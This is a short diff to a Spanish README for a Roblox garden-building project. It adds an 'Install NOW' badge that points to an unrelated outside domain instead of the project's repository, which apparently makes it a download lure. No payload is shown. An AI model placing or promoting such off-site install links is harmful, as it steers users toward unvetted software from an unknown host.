@@ -32,6 +32,9 @@ Encender la creatividad en todos, ofreciendo herramientas educativas para diseñ
 **🎉 Florece Ahora**  
 ¡Da vida a tus mundos con **RobloxGrowGarden**!  
 
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+-
+
 [![Explorar](https://img.shields.io/badge/Explorar-AHORA-blueviolet)](https://github.com/FloreceJardin/RobloxGrowGarden)  
 
 ---
